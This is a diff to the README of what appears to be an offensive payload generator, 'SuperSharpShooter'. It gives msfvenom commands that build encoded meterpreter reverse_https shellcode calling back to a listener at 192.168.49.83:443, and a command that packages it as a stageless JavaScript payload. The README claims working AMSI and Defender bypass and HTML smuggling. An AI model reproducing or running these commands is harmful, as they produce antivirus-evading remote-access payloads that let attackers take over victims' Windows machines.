@@ -9,8 +9,9 @@ What's new:
 I can confirm that stageless js, vbs, and hta all work.  Can also confirm amsi bypass and defender bypass works (at least at this time).  Can also confirm HTML smuggling stageless works.
 
 ### Generate the shellcodes
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
-msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > csharpsc.txt  ### you'll need to remove all variable wrapping such that only the bytes remain
+    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
+
+    msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.83 LPORT=443 -e x64/xor_dynamic  -b '\\x00\\x0a\\x0d' -f raw  > csharpsc.txt  ### you'll need to remove all variable wrapping such that only the bytes remain
 
 ### Core stageless
 ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
